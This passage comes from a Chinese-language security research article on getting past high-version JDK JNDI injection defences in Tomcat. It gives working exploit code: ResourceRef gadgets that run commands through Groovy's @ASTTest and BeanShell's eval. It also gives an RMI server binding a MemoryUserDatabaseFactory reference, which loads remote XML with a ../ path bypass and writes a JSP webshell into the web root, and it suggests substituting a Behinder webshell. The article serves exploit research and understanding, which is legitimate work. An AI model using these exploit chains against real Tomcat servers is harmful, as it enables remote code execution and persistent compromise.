            } else {
                synchronized(this.sourceCache) {
                    String name = source.toExternalForm();
                    this.sourceCache.remove(name);
                    //判断是否为本地file
                    if (this.isFile(source)) {
                        Class var10000;
                        try {
                            var10000 = this.parseClass(new GroovyCodeSource(new File(source.toURI()), this.config.getSourceEncoding()));
                        } catch (URISyntaxException var8) {
                            return this.parseClass(source.openStream(), name);
                        }
                        return var10000;
                    } else {
                        //加载url中指定的groovy
                        return this.parseClass(source.openStream(), name);
                    }
                }
            }
        }
而在parseClass的过程中会执行`@ASTTest`中的代码，因此可以命令执行。
    @groovy.transform.ASTTest(value={assert Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator")})
    class Person{}
在查找资料的过程中，发现[浅析JNDI注入Bypass](https:_www.cnblogs.com_welk1n_p_11066397)中也提到了Groovy的绕过利用,可以看到这里其实可以直接调用`GroovyClassLoader#parseClass`并传入我们构造好的内容执行命令。
    ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=parseClass"));
        String script = "@groovy.transform.ASTTest(value={\n" +
            "    assert java.lang.Runtime.getRuntime().exec(\"calc\")\n" +
            "})\n" +
            "def x\n";
        ref.add(new StringRefAddr("x",script));
## 命令执行利用链挖掘
除了寻找UrlClassLoader加载远程类外，还有一个思路是寻找可以执行命令的点，那么为什么`ScriptEngine`作为JDK自带的可以执行命令的方式不行呢？
因为通过`ScriptEngine`来执行命令，都需要两个参数，所以不能通过ScriptEngine调用执行命令。
    public Object eval(String script, Bindings bindings) throws ScriptException {
            ScriptContext ctxt = getScriptContext(bindings);
            return eval(script , ctxt);
        }
        public Object eval(Reader reader, ScriptContext ctxt) throws ScriptException {
            return this.evalImpl(makeSource(reader, ctxt), ctxt);
        }
尝试通过CodeQL找下`NashornScriptEngine#eval`的调用，确实也没有参数为string类型的调用，所以从原生的JDK中应该是找不到命令执行的点了。
除了上面列出的执行命令的方式外，`beanshell`也可以执行命令，并且满足我们的条件，因此也可以使用beanshell的利用方式。
    ResourceRef ref = new ResourceRef("bsh.Interpreter", null, "", "",
                    true, "org.apache.naming.factory.BeanFactory", null);
                ref.add(new StringRefAddr("forceString", "a=eval"));
                ref.add(new StringRefAddr("a", "exec(\"cmd.exe /c calc.exe\")"));
                return ref;
## MemoryUserDatabaseFactory利用链
上面的分析都是建立在Tomcat下的BeanFactory的利用下的，我们也可以寻找其他实现了ObjectFactory的类利用，浅蓝师傅找到的`MemoryUserDatabaseFactory`利用过程比较精彩，这里着重分析一下。
### XXE
`MemoryUserDatabaseFactory#getObjectInstance`首先创建一个`MemoryUserDatabase`对象，首先看下tomcat对这个对象的解释,和tomcat的用户有关，tomcat会将这个对象中的内容存储到xml中。
> UserDatabase的具体实现，它将所有已定义的用户、组和角色加载到内存中的数据结构中，并使用指定的XML文件进行持久存储。
创建`MemoryUserDatabase`后会从我们传入的引用对象中获取`pathname`、`database`、`readonly`并设置到新建的`MemoryUserDatabase`对象中。
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception {
            if (obj != null && obj instanceof Reference) {
                Reference ref = (Reference)obj;
                //判断class是否是org.apache.catalina.UserDatabase
                if (!"org.apache.catalina.UserDatabase".equals(ref.getClassName())) {
                    return null;
                } else {
                    MemoryUserDatabase database = new MemoryUserDatabase(name.toString());
                    RefAddr ra = null;
                    //从引用对象中获取pathname属性
                    ra = ref.get("pathname");
                    if (ra != null) {
                        //给database设置属性
                        database.setPathname(ra.getContent().toString());
                    }
            //从引用对象中获取readonly属性
                    ra = ref.get("readonly");
                    if (ra != null) {
                        database.setReadonly(Boolean.parseBoolean(ra.getContent().toString()));
                    }
            //从引用对象中获取watchSource属性
                    ra = ref.get("watchSource");
                    if (ra != null) {
                        database.setWatchSource(Boolean.parseBoolean(ra.getContent().toString()));
                    }
                //调用open
                    database.open();
                    //只有readonly属性为false才会进入save方法，readonly属性可以通过引用中获取
                    if (!database.getReadonly()) {
                        //调用save
                        database.save();
                    }
                    return database;
                }
            } else {
                return null;
            }
        }
`open`方法会去加载远程的xml文件并进行解析。
    public void open() throws Exception {
            this.writeLock.lock();
            try {
                this.users.clear();
                this.groups.clear();
                this.roles.clear();
                //从之前保存的属性中获取pathName
                String pathName = this.getPathname();
                //创建URI对象
                URI uri = ConfigFileLoader.getURI(pathName);
                URLConnection uConn = null;
                try {
                    //请求url并获取内容
                    URL url = uri.toURL();
                    uConn = url.openConnection();
                    InputStream is = uConn.getInputStream();
                    this.lastModified = uConn.getLastModified();
                    Digester digester = new Digester();
                    try {
                        digester.setFeature("http://apache.org/xml/features/allow-java-encodings", true);
                    } catch (Exception var28) {
                        log.warn(sm.getString("memoryUserDatabase.xmlFeatureEncoding"), var28);
                    }
                    digester.addFactoryCreate("tomcat-users/group", new MemoryGroupCreationFactory(this), true);
                    digester.addFactoryCreate("tomcat-users/role", new MemoryRoleCreationFactory(this), true);
                    digester.addFactoryCreate("tomcat-users/user", new MemoryUserCreationFactory(this), true);
                    //解析请求后的内容
                    digester.parse(is);
                } catch (IOException var29) {
                    log.error(sm.getString("memoryUserDatabase.fileNotFound", new Object[]{pathName}));
                } catch (Exception var30) {
                    this.users.clear();
                    this.groups.clear();
                    this.roles.clear();
                    throw var30;
                } finally {
                    if (uConn != null) {
                        try {
                            uConn.getInputStream().close();
                        } catch (IOException var27) {
                            log.warn(sm.getString("memoryUserDatabase.fileClose", new Object[]{this.pathname}), var27);
                        }
                    }
                }
            } finally {
                this.writeLock.unlock();
            }
        }
而在parse的过程中会对获取到的xml解析,因此存在xxe漏洞。
    public Object parse(InputStream input) throws IOException, SAXException {
            this.configure();
            InputSource is = new InputSource(input);
            this.getXMLReader().parse(is);
            return this.root;
        }
### RCE
前面也说过`MemoryUserDatabase`存储了Tomcat的用户信息并且会存储到xml，那么我们也知道tomcat中的用户信息是在`tomcat-users.xml`中的，所以是否我们直接在xml中构建一个我们已知账号密码的xml，让其加载。
在open方法加载远程xml并解析后，如果readonly属性我们设置为false会进入save方法保存xml。
save方法首先判断isWriteable是否为true,否则直接返回
    public void save() throws Exception {
            if (this.getReadonly()) {
                log.error(sm.getString("memoryUserDatabase.readOnly"));
                //判断isWriteable是否为true，否则直接返回
            } else if (!this.isWriteable()) {
                log.warn(sm.getString("memoryUserDatabase.notPersistable"));
            } else {
                File fileNew = new File(this.pathnameNew);
                if (!fileNew.isAbsolute()) {
                    fileNew = new File(System.getProperty("catalina.base"), this.pathnameNew);
                }
在`isWriteable`中会将`catalina.base`和`pathname`拼接并判断其目录是否存在如果不存在则返回false。可以看到我们的url地址被处理为`\http:\127.0.0.1\tomcat-user.xml`这种形式，所以我们可以通过`[http://127.0.0.1/../../tomcat-user.xml](http://127.0.0.1/../../tomcat-user.xml)`来绕过，也不会影响xml的加载。
后面就是执行xml文件写入的功能，可以看到执行完后用户的配置文件已经写入到目标目录下，由于真正的配置是在conf目录下的，所以url中还要加个conf目录。
但是这种绕过方式和Tomcat的版本有关，在Tomcat8的open方法中是通过`ConfigFileLoader.getURI(pathName);`来获取xml的是可以加载远程XML的。
在Tomcat7版本中open方法中是通过`ConfigFileLoader.getInputStream(pathName);`获取的。
在`getInputStream`中首先通过file协议加载加载失败才会通过URL记载，所以在Tomcat7中不能通过这种方式直接RCE利用。
### 写文件利用（勘误）
在tomcat7的ConfigFileLoader#getInputStream中，只有当文件已经存在时才会通过FileInputStream加载，如果我们传入的文件不存在，还是会去远程加载文件。因此可以让目标加载我们写好的shell到web目录中。首先开启http服务，并创建webapps/ROOT/test.jsp文件，内容如下：
      "/>
这里还要写成XML的形式否则XML解析过程中会失败。开启RMI服务，代码如下：
    ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "",
              true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
      ref.add(new StringRefAddr("pathname", "http://127.0.0.1:8888/../../webapps/ROOT/test.jsp"));
      ref.add(new StringRefAddr("readonly", "false"));
      ReferenceWrapper war=new ReferenceWrapper(ref);
      Registry registry = LocateRegistry.createRegistry(1099);
      registry.bind("xxx",war);
由于我们传入的文件名不存在，因此还是会加载远程文件。  
最后成功在ROOT目录下写入jsp文件。  
rolename中的内容也可以替换冰蝎马，只要HTML编码后即可。
## 总结
本文讨论的绕过主要是针对Tomcat下的利用，大多数的利用方式建立在tomcat的BeanFactory利用之上，通过上面的分析，我们对这些利用链的发现思路做一个总结。
  * 寻找可以执行命令的函数，可以直接传入一个string参数执行命令（EL、MVEL、Groovy、Beanshell）
  * 寻找UrlClassLoader，但是这种除了GroovyClassLoader比较特殊会在加载的过程中执行命令，其他实现UrlClassLoader的类加载后并不会实例化
  * 已知存在漏洞的组件，可以直接传入String参数利用后间接执行命令(Xstrem、snakeyaml)
我们从利用的角度再思考一下，目前挖掘这么多利用链的方式其实主要是想解决tomcat低版本下的绕过，Tomcat原生的`MemoryUserDatabaseFactory`利用链非常精彩，可以通过写文件的方式利用，但是无法直接RCE，但是写文件的方式需要可以访问到ROOT目录或者知道web的目录，并不能百分百利用成功。也可以依赖一些命令执行或者存在漏洞的组件来利用，并不具备通用性。最后感谢`浅蓝`师傅的分享。
## 参考
[探索高版本 JDK 下 JNDI 漏洞的利用方法](https://tttang.com/archive/1405/)
[浅析JNDI注入Bypass](https:_www.cnblogs.com_welk1n_p_11066397)